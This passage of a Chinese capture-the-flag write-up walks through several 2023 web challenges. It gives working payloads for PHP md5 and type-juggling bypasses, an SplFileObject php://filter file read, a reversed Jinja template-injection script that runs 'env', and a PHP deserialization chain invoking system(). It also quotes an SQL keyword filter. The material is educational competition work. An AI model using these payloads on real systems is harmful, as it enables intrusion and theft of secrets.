class=\"string\">&quot;就这?&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;别来沾边&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>第一个 md5 强比较直接数组绕过<br>\n加个 cookie: <code>cookie=j0k3r</code> <br>\n 传个 aaa 和 bbb, 其中一个在最后加个字母即可， <code>==</code>  弱比较会进行类型转换<br>\n最后有个 foreach 遍历会覆盖 flag 变量的值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get:</span><br><span class=\"line\">?aaa=114514a&amp;bbb=114514&amp;1=flag&amp;flag=1</span><br><span class=\"line\">先将$1=$flag,再将$flag=$1</span><br><span class=\"line\">post:</span><br><span class=\"line\">gdou[]=1&amp;ctf[]=2</span><br></pre></td></tr></table></figure>\n<h3 id=\"22gdouctf-2023反方向的钟\"><a class=\"markdownIt-Anchor\" href=\"#22gdouctf-2023反方向的钟\">#</a> 22.[GDOUCTF 2023] 反方向的钟</h3>\n<p>此题考到 php 的内置类 SplFileObject</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// flag.php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">teacher</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$rank</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$salary</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$rank</span>, <span class=\"variable\">$salary</span> = <span class=\"number\">10000</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;rank = <span class=\"variable\">$rank</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;salary = <span class=\"variable\">$salary</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">classroom</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$leader</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$leader</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;leader = <span class=\"variable\">$leader</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hahaha</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;name != <span class=\"string\">&#x27;one class&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable language_\">$this</span>-&gt;leader-&gt;name != <span class=\"string\">&#x27;ing&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable language_\">$this</span>-&gt;leader-&gt;rank != <span class=\"string\">&#x27;department&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> False;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> True;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">school</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$department</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$headmaster</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$department</span>, <span class=\"variable\">$ceo</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;department = <span class=\"variable\">$department</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;headmaster = <span class=\"variable\">$ceo</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">IPO</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;headmaster == <span class=\"string\">&#x27;ong&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Pretty Good ! Ctfer!\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">new</span> <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;a&#x27;</span>](<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;b&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;department-&gt;<span class=\"title function_ invoke__\">hahaha</span>()) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">IPO</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;d&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;d&#x27;</span>]));</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">school</span>(<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">classroom</span>(<span class=\"string\">&#x27;one class&#x27;</span>,<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">teacher</span>(<span class=\"string\">&#x27;ing&#x27;</span>,<span class=\"string\">&#x27;department&#x27;</span>)),<span class=\"string\">&#x27;ong&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>链子很好找，主要是 <code> echo new $_POST['a']($_POST['b']);</code>  怎么利用？<br>\na=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php</p>\n<h3 id=\"23hznuctf-2023-preliminaryflask\"><a class=\"markdownIt-Anchor\" href=\"#23hznuctf-2023-preliminaryflask\">#</a> 23.[HZNUCTF 2023 preliminary]flask</h3>\n<p>此题将输入的内容倒置了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;7*7&#125;&#125;不行,&#125;&#125;7*7&#123;&#123;可以</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">url=<span class=\"string\">&#x27;http://node2.anna.nssctf.cn:28463/?name=&#x27;</span>  </span><br><span class=\"line\"><span class=\"built_in\">str</span>=<span class=\"string\">&#x27;&#x27;&#x27;&#123;%print(lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;env&#x27;).read())%&#125;&#x27;&#x27;&#x27;</span>  </span><br><span class=\"line\">payload=<span class=\"built_in\">str</span>[::-<span class=\"number\">1</span>]  </span><br><span class=\"line\">url+=payload  </span><br><span class=\"line\">r=requests.get(url=url)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure>\n<p>什么是 env?</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">env 是一个用于显示系统环境变量的命令行工具。在不带参数的情况下，它会列出当前 shell 中所有的环境变量。通过使用该命令，可以查看操作系统中设置的环境变量，以及对它们进行增加、修改、删除等操作。</span><br></pre></td></tr></table></figure>\n<h3 id=\"24hznuctf-2023-preliminaryppppop\"><a class=\"markdownIt-Anchor\" href=\"#24hznuctf-2023-preliminaryppppop\">#</a> 24.[HZNUCTF 2023 preliminary]ppppop</h3>\n<p>打开什么也没有，抓包看一下，发现 cookie 处</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: user=Tzo0OiJVc2VyIjoxOntzOjc6ImlzQWRtaW4iO2I6MDt9</span><br><span class=\"line\"></span><br><span class=\"line\">base64解码之后是:</span><br><span class=\"line\">O:4:&quot;User&quot;:1:&#123;s:7:&quot;isAdmin&quot;;b:0;&#125;</span><br><span class=\"line\">把b:0改成b:1然后base64编码改成新的cookie发包,就能看见内容</span><br></pre></td></tr></table></figure>\n<p>php 代码:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;utils.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$className</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$funcName</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$args</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$class</span> = <span class=\"keyword\">new</span> <span class=\"variable language_\">$this</span>-&gt;className;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$funcName</span> = <span class=\"variable language_\">$this</span>-&gt;funcName;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$class</span>-&gt;<span class=\"variable\">$funcName</span>(<span class=\"variable language_\">$this</span>-&gt;args);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>, <span class=\"variable\">$arg</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$func</span>(<span class=\"variable\">$arg</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">checkUser</span>()) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$payload</span> = <span class=\"title function_ invoke__\">strrev</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;payload&#x27;</span>]));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$payload</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;utils.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$className</span>=<span class=\"string\">&quot;B&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$funcName</span>=<span class=\"string\">&#x27;system&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$args</span>=<span class=\"string\">&#x27;env&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$class</span> = <span class=\"keyword\">new</span> <span class=\"variable language_\">$this</span>-&gt;className;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$funcName</span> = <span class=\"variable language_\">$this</span>-&gt;funcName;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$class</span>-&gt;<span class=\"variable\">$funcName</span>(<span class=\"variable language_\">$this</span>-&gt;args);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>, <span class=\"variable\">$arg</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$func</span>(<span class=\"variable\">$arg</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">A</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">strrev</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>)));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\">/*post传:</span></span><br><span class=\"line\"><span class=\"comment\">payload=fTsidm5lIjozOnM7InNncmEiOjQ6czsibWV0c3lzIjo2OnM7ImVtYU5jbnVmIjo4OnM7IkIiOjE6czsiZW1hTnNzYWxjIjo5OnN7OjM6IkEiOjE6Tw==*/</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"25hdctf-2023loginmaster\"><a class=\"markdownIt-Anchor\" href=\"#25hdctf-2023loginmaster\">#</a> 25.[HDCTF 2023]LoginMaster</h3>\n<p>通过 dirsearch 扫到 robots.txt, 打开发现过滤了一些东西</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function checkSql($s) </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i&quot;,$s))&#123;</span><br><span class=\"line\">        alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class=\"line\">        die($FLAG);</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">    alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br></pre></td></tr></table></figure>\n<p><code>Quine</code>  又叫做自产生程序，在 <code>sql</code>  注入技术中，这是一种使得输入的 <code>sql</code>  语句和输出的 <code>sql</code>  语句一致的技术，常用于一些特殊的登陆绕过 